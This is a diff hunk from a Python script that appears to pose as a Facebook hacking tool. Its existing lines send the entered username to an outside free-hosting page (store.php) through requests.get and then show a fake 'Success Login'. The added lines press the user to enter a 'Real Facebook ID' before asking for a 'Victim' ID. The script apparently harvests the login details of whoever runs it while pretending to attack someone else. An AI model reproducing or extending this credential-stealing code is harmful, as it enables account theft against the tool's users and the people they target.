@@ -20,6 +20,8 @@ url = "https://alladinne.000webhostapp.com/store.php?username="+str(username)+"&
 con = requests.get(url)
 print(colored('Success Login......','green'))
 time.sleep(2)
+print(colored('Please Enter Real Facebook ID ## IMPORTANT ##','green'))
+time.sleep(2)
 victim = input('Enter Your Victim Facebook ID::')
 time.sleep(3)
 print(colored('Fitching data please wait.......','green'))
